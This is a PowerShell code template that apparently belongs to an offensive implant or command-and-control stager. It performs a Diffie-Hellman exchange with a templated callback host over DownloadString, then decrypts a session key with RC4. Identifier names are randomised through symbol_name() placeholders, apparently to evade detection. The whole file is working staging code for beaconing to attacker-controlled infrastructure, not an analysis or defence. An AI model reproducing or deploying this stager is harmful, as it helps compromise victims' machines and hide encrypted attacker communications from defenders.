$dh_endpoint = "{{dh_endpoint}}";
$DH_MODULUS = [bigint]'{{DH_MODULUS}}';
$DH_G = [bigint]'{{DH_G}}';

$Client_Secret = ([bigint](Get-Random -Max ([bigint]::Pow(2, 128))));
$Client_Public = [bigint]::ModPow($DH_G, $Client_Secret, $DH_MODULUS);

{{'Write-Debug "DH Endpoint: $dh_endpoint"'|debug}}
{{'Write-Debug "DH Modulus: $DH_MODULUS"'|debug}}
{{'Write-Debug "Client public: $Client_Public"'|debug}}
{{'Write-Debug "Client secret: $Client_Secret"'|debug}}

$response = ${{symbol_name('web_client')}}.DownloadString("{{callback}}$dh_endpoint/$Client_Public").Split();

$Server_Public = [bigint]($response[0]);
$encrypted_key = [System.Convert]::FromBase64String($response[1]);
{{'Write-Debug "Server public: $Server_Public"'|debug}}

$shared_secret = [bigint]::ModPow($Server_Public, $Client_Secret, $DH_MODULUS);
{{'Write-Debug "Shared Secret: $shared_secret"'|debug}}
$shared_secret = ([bigint]$shared_secret).ToByteArray()[0..63];

{{'Write-Debug "Shared Secret (bytes): $shared_secret"'|debug}}
{{'Write-Debug "Encrypted key: $encrypted_key"'|debug}}

${{symbol_name("global_key")}} = {{symbol_name("Decrypt-RC4")}} $encrypted_key $shared_secret;
